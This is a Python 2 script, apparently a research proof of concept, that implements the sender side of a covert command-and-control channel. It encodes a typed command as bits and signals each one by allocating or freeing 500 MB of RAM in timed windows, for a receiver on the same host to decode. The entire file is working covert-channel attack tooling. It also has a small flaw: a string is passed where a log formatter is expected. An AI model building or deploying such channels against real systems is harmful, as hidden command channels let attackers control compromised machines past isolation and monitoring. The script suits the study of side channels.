#!/usr/bin/python
# Written by yehudacorsia@gmail.com

import time
import binascii
import datetime
import timeit
import logging
import sys

# Globals

TIME_BETWEEN_SEND_ZERO = 5  # seconds

MEGABYTE_IN_BYTES = 2**20
BYTES_IN_RAM_TO_USE = 500 * MEGABYTE_IN_BYTES
TIMES_TO_CHECK_ALLOCATE = 10


##############################################################################
# Log config.
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

file_formatter = logging.Formatter("%(asctime)s:%(name)s:%(message)s")

log_file_handler = logging.FileHandler("sender.log", mode="a")
log_file_handler.setFormatter(file_formatter)

logger.addHandler(log_file_handler)

stdout_handler = logging.StreamHandler(sys.stdout)
stdout_formatter = logging.Formatter("%(message)s")
stdout_handler.setFormatter("")
stdout_handler.setLevel(logging.INFO)

logger.addHandler(stdout_handler)
##############################################################################


def time_it_take_to_allocate(ram_size):
    """
        Calculate the time it takes for the host to allocate the required memory. This number varies between hosts.
    """
    # allocate the ram size, and delete him. and repeat to this 5 times and get the average time.
    return timeit.Timer('temp = "A" * {}; del temp'.format(ram_size)).timeit(
        number=TIMES_TO_CHECK_ALLOCATE) / TIMES_TO_CHECK_ALLOCATE


def main():
    logger.info("Welcome to our new Command and control")
    logger.info("that uses Side-channel attack that we found")

    logger.info("\nCalculate the time it takes to allocate memory")
    time_to_save_and_del_in_ram = time_it_take_to_allocate(BYTES_IN_RAM_TO_USE)

    logger.info("Time it takes to allocate {} bytes in ram is: {}\n".format(
        BYTES_IN_RAM_TO_USE, time_to_save_and_del_in_ram))

    time_between_send_one = TIME_BETWEEN_SEND_ZERO - time_to_save_and_del_in_ram

    string_to_send = raw_input("Enter your command:\n")

    # Append the first zero since we're sending ascii values
    bin_to_send = "0" + bin(int(binascii.hexlify(string_to_send), 16))[2:]

    logger.info("\nSending string: '{}'\n".format(string_to_send))
    logger.info("String binary value is : {}\n".format(bin_to_send))

    logger.info("Will wait {} seconds between each Bit.".format(TIME_BETWEEN_SEND_ZERO))

    raw_input("Press Enter to start sending...\n")

    logger.info("Synchronize bit window time (wait until host second % 20 == 0)")
    while datetime.datetime.now().second % 20 != 0:
        time.sleep(0.1)

    for curr_binary in bin_to_send:
        if curr_binary == "1":
            # save in memory
            temp = "a" * BYTES_IN_RAM_TO_USE
            time.sleep(time_between_send_one)
            del temp
            logger.info("{} : Send : 1".format(datetime.datetime.now()))
        else:
            time.sleep(TIME_BETWEEN_SEND_ZERO)
            logger.info("{} : Send : 0".format(datetime.datetime.now()))

    logger.info("Finished sending the command: '{}'".format(string_to_send))


if __name__ == '__main__':
    main()
